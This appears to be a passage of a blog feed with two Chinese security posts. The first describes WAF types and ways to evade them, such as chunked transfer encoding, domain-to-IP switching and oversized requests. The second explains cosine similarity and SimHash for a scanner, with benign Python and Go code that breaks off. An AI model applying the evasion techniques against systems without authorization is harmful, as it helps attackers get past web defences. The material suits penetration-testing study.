    <content type="html"><![CDATA[<h1 id="绕过waf之分块传输"><a href="#绕过waf之分块传输" class="headerlink" title="绕过waf之分块传输"></a>绕过waf之分块传输</h1><p>在渗透测试的过程中，遇到WAF也就意味着，我们不能使用安全工具进行渗透测试，因为如果一旦触碰了WAF的规则，轻则丢弃报文，重则拉黑IP，所以，我们需要手工对WAF进行绕过，我们需要对WAF有一个简单的了解。</p><h2 id="WAF的分类"><a href="#WAF的分类" class="headerlink" title="WAF的分类"></a>WAF的分类</h2><ul><li><p>嵌入型</p><ul><li>硬件行WAF：以硬件的形式部署在链路中，支持多种部署，当串联到链路中时可以拦截恶意流量，在旁路监听时，只记录攻击，不进行拦截</li><li>软件型WAF：以软件的形式安装在服务器中，可以直接检测服务器是否存在webshell，是否有文件被直接创造过等</li><li>云WAF，一般以反向代理的形式工作，通过配置NS，或者NNAME记录，使得网站的请求报文优先经过WAF主机，经过WAF主机过滤以后，将被认为无害的请求报文发送给实际网站服务器进行请求，可以认为是带防护功能的CDN</li></ul></li><li><p>嵌入型</p><p>​    网站的内置WAF，直接将WAF嵌入到代码中，相对来说，自由度极高，网站内置的WAF与业务更加契合</p></li></ul><h2 id="如何判断是否有WAF"><a href="#如何判断是否有WAF" class="headerlink" title="如何判断是否有WAF"></a>如何判断是否有WAF</h2><h3 id="手动检查"><a href="#手动检查" class="headerlink" title="手动检查"></a>手动检查</h3><p>手动在域名后面加一个不存在的id参数，并且加上很明显的sql语句，查看服务器的回应。</p><p><img src="https://img-blog.csdnimg.cn/20191219162543732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p><h3 id="SQLmap检测"><a href="#SQLmap检测" class="headerlink" title="SQLmap检测"></a>SQLmap检测</h3><p>如果网站存在WAF，sqlmap会有提示。</p><p><img src="https://img-blog.csdnimg.cn/20191212150628456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p><h2 id="WAF的工作原理"><a href="#WAF的工作原理" class="headerlink" title="WAF的工作原理"></a>WAF的工作原理</h2><p>WAF(Web Application Firewall) 可以用来屏蔽常见的网站漏洞攻击，如SQL注入，XML注入、XSS等。WAF针对的是应用层而非网络层的入侵，从技术角度应该称之为Web IPS。</p><p>WAF的主要难点是对入侵的检测能力，尤其是对Web服务入侵的检测，WAF最大的挑战是识别率。对于已知的攻击方式，可以谈识别率，但是对于未知的攻击手段，WAF是检测不到的。</p><h3 id="基于规则匹配的WAF"><a href="#基于规则匹配的WAF" class="headerlink" title="基于规则匹配的WAF"></a>基于规则匹配的WAF</h3><p>目前市面上大多数的WAF都是基于规则的WAF。即WAF对接数据收到的包进行正则匹配过滤，如果正则匹配到与现有漏洞知识库的攻击代码相同，则认为这个恶意代码，从而对于进行阻断。所以，对于基于规则匹配的WAF，需要每天都及时更新最新的漏洞库</p><p>对于这种WAF，它的工作过程是这样的：<strong>解析HTTP请求——&gt;匹配规则——&gt;防御动作——&gt;记录日志</strong> </p><p>具体实现如下：</p><ol><li>解析http请求：协议解析模块</li><li>匹配规则：规则检测模块，匹配规则库</li><li>防御动作：：return 403 或者跳转到自定义界面，或者不返回任何数据，或者拉黑IP</li><li>日志记录：记录到elk中 (E&#x3D;Elasticsearch(基于 Lucene),L&#x3D;Logstash,K&#x3D;Kibana)</li></ol><h2 id="WAF的绕过"><a href="#WAF的绕过" class="headerlink" title="WAF的绕过"></a>WAF的绕过</h2><p>从WAF工作的机制我们可以知道，只有在WAF解析HTTTP请求或者WAF匹配规则两方面绕过。</p><h3 id="域名转换为IP"><a href="#域名转换为IP" class="headerlink" title="域名转换为IP"></a>域名转换为IP</h3><p>有些WAF设置的是针对域名的防护，在有些时候，我们可以尝试将域名改成ip地址有可以绕过WAF的防护。</p><h3 id="WAF解析HTTP请求阶段绕过"><a href="#WAF解析HTTP请求阶段绕过" class="headerlink" title="WAF解析HTTP请求阶段绕过"></a>WAF解析HTTP请求阶段绕过</h3><p>参考此文章</p><p><a href="https://blog.csdn.net/qq_36119192/article/details/82942185#%E4%B8%80%E6%AC%A1HTTP%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BF%87%E7%A8%8B">https://blog.csdn.net/qq_36119192/article/details/82942185#%E4%B8%80%E6%AC%A1HTTP%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BF%87%E7%A8%8B</a></p><p>我们可以知道HTTP请求过程中的各种数据</p><h3 id="分块编码（Transfer-Encoding）绕过WAF"><a href="#分块编码（Transfer-Encoding）绕过WAF" class="headerlink" title="分块编码（Transfer-Encoding）绕过WAF"></a>分块编码（Transfer-Encoding）绕过WAF</h3><h4 id="数据的分段传输"><a href="#数据的分段传输" class="headerlink" title="数据的分段传输"></a>数据的分段传输</h4><p>我们都知道http协议是由TCP协议封装而来的应用层协议。我们和服务器之间的每次http交互都要进行三次握手和四次挥手。那么，服务器端怎么判断客户端传来的数据已经发送完了，然后断开这次tcp连接呢？我们客户端在发送给服务器端报文中有一个Connection 字段，一般这个值为 close。也就是说这次数据传输完成了，服务器就会断开这次tcp连接。但是，当我们要传送的数据量比较大，一次传输不能传输完成时，该如何办呢？这就要用到数据的分段传输了。</p><p>当使用分段传输时，请求头中的 Connection字段的值为：keep-alive ，最后一个数据包的Connection字段值为：close。</p><p>当服务器端收到Connection值为keep-alive的数据包时，会先将它存储在一个缓冲区中，当收到 Connection 值为 close 的数据包时，即表明这次数据传输完成！</p><p>通常，Content-Length 消息头字段表示数据的长度。数据的长度很重要，因为服务器端需要知道哪里是应答消息的结束，以及后续应答消息的开始。然而，使用分段传输，数据分解成一系列数据块，并以一个或多个块发送，这样可以发送数据而不需要预先知道发送内容的总大小。通常数据块的大小是一致的，但也不总是这种情况。于是我们分段进行传输数据的每一次请求的Content-Length是我们这次请求的大小，当服务器端收到 Connection值为close的请求消息后，就会把之前的Content-Length加起来，即是我们请求的数据的总大小了。</p><h4 id="数据分块编码"><a href="#数据分块编码" class="headerlink" title="数据分块编码"></a>数据分块编码</h4><p>数据的分块编码就是将完整的请求数据，分块进行编码传输。在请求头中加入这么一个字段：  Transfer-Encoding: chunked ，即表示这个报文采用了分段编码，分段编码只适用于 POST 提交方式。</p><p>这时，POST请求报文中的数据部分需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，空格也算一个长度值，长度值独占一行，最后需要用0独占一行表示编码结束。并在0后空两行表示数据包结束，不然点击提交按钮后会看到一直处于waiting状态。</p><p><img src="https://img-blog.csdnimg.cn/20190323125235304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p><p>在长度后加分号绕过(;)—&gt; 注释</p><p><a href="https://www.freebuf.com/articles/web/194351.html">https://www.freebuf.com/articles/web/194351.html</a></p><h4 id="burp-分块传输的插件"><a href="#burp-分块传输的插件" class="headerlink" title="burp 分块传输的插件"></a>burp 分块传输的插件</h4><p><a href="https://www.hackliu.com/?p=454">https://www.hackliu.com/?p=454</a></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>其他关于构造HTTP协议来绕过WAF，需要攻击者对HTTP协议的各个字段构造，各容器对于HTTP协议的解析 都很熟悉</p><h3 id="WAF匹配阶段绕过"><a href="#WAF匹配阶段绕过" class="headerlink" title="WAF匹配阶段绕过"></a>WAF匹配阶段绕过</h3><h4 id="利用溢量数据绕过WAF"><a href="#利用溢量数据绕过WAF" class="headerlink" title="利用溢量数据绕过WAF"></a>利用溢量数据绕过WAF</h4><p>这种绕过方法利用的是通过提交非常大的数据，由于数据量过大，超过了WAF的正则匹配字符，我们的恶意代码就不经过WAF的正则匹配了，因此我们的恶意代码就进行绕过了。</p><p>其他就是构造畸形数据块，去发送相关的流量包</p><p><a href="https://www.freebuf.com/news/193659.html">https://www.freebuf.com/news/193659.html</a></p>]]></content>
    
    
    <summary type="html">对WAF绕过的简单描述</summary>
    
    
    
    <category term="渗透测试" scheme="https://h0ld1rs.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="绕过Waf" scheme="https://h0ld1rs.github.io/tags/%E7%BB%95%E8%BF%87Waf/"/>
    
  </entry>
  
  <entry>
    <title>扫描器之文本相似度计算</title>
    <link href="https://h0ld1rs.github.io/posts/54507.html"/>
    <id>https://h0ld1rs.github.io/posts/54507.html</id>
    <published>2022-03-22T07:35:07.000Z</published>
    <updated>2022-03-24T02:03:31.222Z</updated>
    
    <content type="html"><![CDATA[<h1 id="扫描器之文本相似度计算"><a href="#扫描器之文本相似度计算" class="headerlink" title="扫描器之文本相似度计算"></a>扫描器之文本相似度计算</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>被师傅问到这样一些情况：当使用扫描器去扫描页面，发现有些页面如403是自定义的页面，这种情况该怎么办，我当时想的是，直接去获取<code>context</code>里面的文本，有403 的话，可以跳过。但是，师傅好像不是这样说的，和泛解析差不多的思路。都可以用文本相似度来解决。</p><h2 id="文本相似度算法"><a href="#文本相似度算法" class="headerlink" title="文本相似度算法"></a>文本相似度算法</h2><h2 id="余弦相似性"><a href="#余弦相似性" class="headerlink" title="余弦相似性"></a>余弦相似性</h2><p>首先，我们先来简单看一下，什么是余弦相似性</p><p>先来看两个句子：</p><blockquote><p>句子A：我喜欢看电视，不喜欢看电影</p><p>句子B：我不喜欢看电视，也不喜欢看电影</p></blockquote><p>如果要计算上面两句话的相似度的话：</p><p>基本思路是：如果这两句话的用词越相似，它们的内容就应该越相似。因此，可以从词频入手，计算它们的相似程度。</p><h4 id="1-分词"><a href="#1-分词" class="headerlink" title="1. 分词"></a>1. 分词</h4><blockquote><p>句子A：我&#x2F;喜欢&#x2F;看&#x2F;电视，不&#x2F;喜欢&#x2F;看&#x2F;电影</p><p>句子B：我&#x2F;不&#x2F;喜欢&#x2F;看&#x2F;电视，也&#x2F;不&#x2F;喜欢&#x2F;看&#x2F;电影</p></blockquote><h4 id="2-列出所有的词"><a href="#2-列出所有的词" class="headerlink" title="2. 列出所有的词"></a>2. 列出所有的词</h4><blockquote><p>我，喜欢，看，电视，电影，不，也</p></blockquote><h4 id="3-计算词频"><a href="#3-计算词频" class="headerlink" title="3. 计算词频"></a>3. 计算词频</h4><blockquote><p>句子A：我：1，喜欢：2，看：2，电视：1，电影：1，不：1，也：0</p><p>句子B：我：1，喜欢：2，看：2，电视：1，电影：1，不：2，也：1</p></blockquote><h4 id="4-写出词频向量"><a href="#4-写出词频向量" class="headerlink" title="4. 写出词频向量"></a>4. 写出词频向量</h4><blockquote><p>句子A：[1,2,2,1,1,1,0]</p><p>句子B：[1,2,2,1,1,2,1]</p></blockquote><p>到这里，问题就变成了如何计算这两个向量的相似程度</p><p>我们可以把它们想象成空间中的两条线段，都是从原点（[0, 0, …]）出发，指向不同的方向。两条线段之间形成一个夹角，如果夹角为0度，意味着方向相同、线段重合；如果夹角为90度，意味着形成了直角，方向完全不相似，如果角度为180°，意味着方向相反，我们可以通过夹角的大小，来判断向量的相似程度。夹角越小，就代表越相似。</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220323153753.png"></p><p>以二维空间为例，上图的a和b是两个向量，我们要计算它们的夹角θ，余弦定理告诉我们，可以用下面的公式求得：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220323152725.png"></p><p>　数学家已经证明，余弦的这种计算方法对n维向量也成立。</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220323153857.png"></p><p>假定A和B是两个n维向量，A是 [A1, A2, …, An] ，B是 [B1, B2, …, Bn] ，则A与B的夹角θ的余弦等于：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220323153935.png"></p><p>使用这个公式，我们就可以得到，句子A与句子B的夹角的余弦。</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220323154103.png"></p><p>余弦值越接近1，就表明夹角越接近0度，也就是两个向量越相似，这就叫”余弦相似性”。所以，上面的句子A和句子B是很相似的，事实上它们的夹角大约为20.3度。</p><p>由此，我们就得到了”找出相似文章”的一种算法：</p><p>　            1、使用TF-IDF算法，找出两篇文章的关键词；</p><p>　　　　2、每篇文章各取出若干个关键词（比如20个），合并成一个集合，计算每篇文章对于这个集合中的词的词频（为了避免文章长度的差异，可以使用相对词频）；</p><p>　　　　3、生成两篇文章各自的词频向量；</p><p>　　　　4、计算两个向量的余弦相似度，值越大就表示越相似。</p><h3 id="SimHash"><a href="#SimHash" class="headerlink" title="SimHash"></a>SimHash</h3><p>SimHash为Google处理海量网页的采用的文本相似判定方法。该方法的主要目的是降维，即将高维的特征向量映射成f-bit的指纹，通过比较两篇文档指纹的汉明距离来表征文档重复或相似性。</p><p>　　　</p><p>备注：此处f-bit指纹，可以根据应用需求，定制为16位、32位、64位或者128位数等。</p><p>simhash算法分为5个步骤：分词、hash、加权、合并、降维，具体过程如下所述：</p><h4 id="1-分词-1"><a href="#1-分词-1" class="headerlink" title="1. 分词"></a>1. 分词</h4><p>如上面的余弦相似性的步骤类似</p><h4 id="2-hash"><a href="#2-hash" class="headerlink" title="2. hash"></a>2. hash</h4><p>通过hash函数计算各个特征向量的hash值，hash值为二进制数01组成的n-bit签名。比如比如句子 A：我 1，喜欢 2，看 2，电视 1，电影 1，不 1，也 0 中的  hash值Hash：</p><p>(喜欢)为100101，“电视”的hash值Hash(电视)为“101011”（当然实际的值要比这个复杂，hash串比这要长）</p><p>就这样，字符串就变成了一系列数字。</p><h4 id="3-加权"><a href="#3-加权" class="headerlink" title="3. 加权"></a>3. 加权</h4><p>通过 2步骤的hash生成结果，需要按照单词的权重形成加权数字串，比如“喜欢”的hash值为“100101”，把hash值从左到右与权重相乘，如果为1则乘以1 ，如果是0则曾以-1 ，喜欢的权重是2 计算为“2 -2 -2 2 -2 2”；</p><h4 id="4-合并"><a href="#4-合并" class="headerlink" title="4. 合并"></a>4. 合并</h4><p>把上面所有各个单词算出来的序列值累加，变成只有一个序列串。比如 “喜欢”的“2 -2 -2 2 -2 2”，“电视”的 “ 1 -1 1 -1 1 1”， 把每一位进行累加， （2+1）+（-2-1）+（-2+1）+（2-1）+（-2+1）+（2+1）&#x3D;3 -3 -1 1 -1 3</p><h4 id="5-降维"><a href="#5-降维" class="headerlink" title="5. 降维"></a>5. 降维</h4><p>把4步算出来的 “3 -3 -1 1 -1 3” 变成 0 1 串，形成我们最终的simhash签名。 如果每一位大于0 记为 1，小于0 记为 0。最后算出结果为：“1 0 0 1 0 1”。这样就得到了每篇文档的SimHash签名值</p><h4 id="6-海明距离"><a href="#6-海明距离" class="headerlink" title="6. 海明距离"></a>6. 海明距离</h4><p>海明距离的求法：异或时，只有在两个比较的位不同时其结果是1 ，否则结果为0，两个二进制“异或”后得到1的个数即为海明距离的大小。</p><p>根据经验值，对64位的 SimHash值，海明距离在3以内的可认为相似度比较高。</p><p>根据经验值，对64位的 SimHash值，海明距离在3以内的可认为相似度比较高。</p><p>比如：</p><blockquote><p>A：我喜欢看电视，不喜欢看电影 其hash值为 1 0 0 1 0 1</p><p>B：我也很喜欢看电视，但不喜欢看电影 其hash值为 1 0 1 1 0 1</p></blockquote><p>两者 hash 异或运算结果 001000，统计结果中1的个数是1，那么两者的海明距离就是1，说明两者比较相似。</p><p>下面是python代码的实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">simhash</span>:</span><br><span class="line">    <span class="comment"># 构造函数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, tokens=<span class="string">&#x27;&#x27;</span>, hashbits=<span class="number">128</span></span>):</span><br><span class="line">        self.hashbits = hashbits</span><br><span class="line">        self.<span class="built_in">hash</span> = self.simhash(tokens)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成simhash值</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">simhash</span>(<span class="params">self, tokens</span>):</span><br><span class="line">        <span class="comment"># v是长度128的列表</span></span><br><span class="line">        v = [<span class="number">0</span>] * self.hashbits</span><br><span class="line">        tokens_hash = [self.string_hash(x) <span class="keyword">for</span> x <span class="keyword">in</span> tokens]</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> tokens_hash:  <span class="comment"># t为token的普通hash值</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.hashbits):</span><br><span class="line">                bitmask = <span class="number">1</span> &lt;&lt; i</span><br><span class="line">                <span class="keyword">if</span> t &amp; bitmask:</span><br><span class="line">                    v[i] += <span class="number">1</span>  <span class="comment"># 查看当前bit位是否为1,是的话将该位+1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    v[i] -= <span class="number">1</span>  <span class="comment"># 否则的话,该位-1</span></span><br><span class="line">        fingerprint = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.hashbits):</span><br><span class="line">            <span class="keyword">if</span> v[i] &gt;= <span class="number">0</span>:</span><br><span class="line">                fingerprint += <span class="number">1</span> &lt;&lt; i</span><br><span class="line">        <span class="keyword">return</span> fingerprint  <span class="comment"># 整个文档的fingerprint为最终各个位&gt;=0的和</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 求海明距离</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hamming_distance</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="comment"># 异或结果</span></span><br><span class="line">        xorResult = (self.<span class="built_in">hash</span> ^ other.<span class="built_in">hash</span>)</span><br><span class="line">        <span class="comment"># 128个1的二进制串</span></span><br><span class="line">        hashbit128 = ((<span class="number">1</span> &lt;&lt; self.hashbits) - <span class="number">1</span>)</span><br><span class="line">        x = xorResult &amp; hashbit128</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> x:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            x &amp;= x - <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 求相似度</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">similarity</span>(<span class="params">self, other</span>):</span><br><span class="line">        a = <span class="built_in">float</span>(self.<span class="built_in">hash</span>)</span><br><span class="line">        b = <span class="built_in">float</span>(other.<span class="built_in">hash</span>)</span><br><span class="line">        <span class="keyword">if</span> a &gt; b:</span><br><span class="line">            <span class="keyword">return</span> b / a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> a / b</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 针对source生成hash值</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">string_hash</span>(<span class="params">self, source</span>):</span><br><span class="line">        <span class="keyword">if</span> source == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result = <span class="built_in">ord</span>(source[<span class="number">0</span>]) &lt;&lt; <span class="number">7</span></span><br><span class="line">            m = <span class="number">1000003</span></span><br><span class="line">            hashbit128 = ((<span class="number">1</span> &lt;&lt; self.hashbits) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> source:</span><br><span class="line">                temp = (result * m) ^ <span class="built_in">ord</span>(c)</span><br><span class="line">                result = temp &amp; hashbit128</span><br><span class="line"></span><br><span class="line">            result ^= <span class="built_in">len</span>(source)</span><br><span class="line">            <span class="keyword">if</span> result == -<span class="number">1</span>:</span><br><span class="line">                result = -<span class="number">2</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    s = <span class="string">&#x27;你 知道 里约 奥运会，媒体 玩出了 哪些 新花样？&#x27;</span></span><br><span class="line">    hash1 = simhash(s.split())</span><br><span class="line">    <span class="built_in">print</span> hash1.__str__()</span><br><span class="line">    s = <span class="string">&#x27;我不知道 里约 奥运会，媒体 玩出了 哪些 新花样&#x27;</span></span><br><span class="line">    hash2 = simhash(s.split())</span><br><span class="line">    <span class="built_in">print</span> hash2.__str__()</span><br><span class="line">    s = <span class="string">&#x27;视频 直播 全球 知名 媒体 的 战略 转移&#x27;</span></span><br><span class="line">    hash3 = simhash(s.split())</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(hash1.hamming_distance(hash2), <span class="string">&quot;   &quot;</span>, hash1.similarity(hash2))</span><br><span class="line">    <span class="built_in">print</span>(hash1.hamming_distance(hash3), <span class="string">&quot;   &quot;</span>, hash1.similarity(hash3))</span><br><span class="line">    <span class="built_in">print</span>(hash2.hamming_distance(hash3), <span class="string">&quot;   &quot;</span>, hash2.similarity(hash3))</span><br></pre></td></tr></table></figure><h2 id="go语言扫描器雏形"><a href="#go语言扫描器雏形" class="headerlink" title="go语言扫描器雏形"></a>go语言扫描器雏形</h2><p>期间，出现一些问题，比如，百度的首页，使用<code>http</code>协议访问的时候，会出现一些问题，原因是百度会随机加载<code>js</code>，他们的名称不同，通过获取<code>response.body</code>的信息自然也变得不能接受。应该算百度的反爬策略，目前为止，，好像除了百度首页，，我还没遇到其他的，，就先放一放吧。。。。等以后有眉头的再搞。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;math/big&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> SimHash <span class="keyword">struct</span> &#123;</span><br><span class="line">IntSimHash *big.Int</span><br><span class="line">HashBits   <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">距离 补偿</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *SimHash)</span></span> HammingDistance(hash, other *big.Int) *big.Int &#123;</span><br><span class="line">hase_v := <span class="built_in">new</span>(big.Int)</span><br><span class="line">c_w := hase_v.Xor(hash, other)</span><br><span class="line">fbIng := big.NewInt(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">fbIng.Lsh(fbIng, <span class="type">uint</span>(s.HashBits))</span><br><span class="line">bit_big := <span class="built_in">new</span>(big.Int)</span><br><span class="line">t_mak := bit_big.Sub(fbIng, big.NewInt(<span class="number">1</span>))</span><br><span class="line">c_result := <span class="built_in">new</span>(big.Int)</span><br><span class="line">c_result.And(c_w, t_mak)</span><br><span class="line"><span class="comment">//fmt.Println(c_result)</span></span><br><span class="line"></span><br><span class="line">tot := big.NewInt(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> c_result.Cmp(big.NewInt(<span class="number">0</span>)) &gt; <span class="number">0</span> &#123;</span><br><span class="line">tot.Add(tot, big.NewInt(<span class="number">1</span>))</span><br><span class="line">ts := <span class="built_in">new</span>(big.Int)</span><br><span class="line">ts.Sub(c_result, big.NewInt(<span class="number">1</span>))</span><br><span class="line">c_result.And(c_result, ts)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> tot</span><br><span 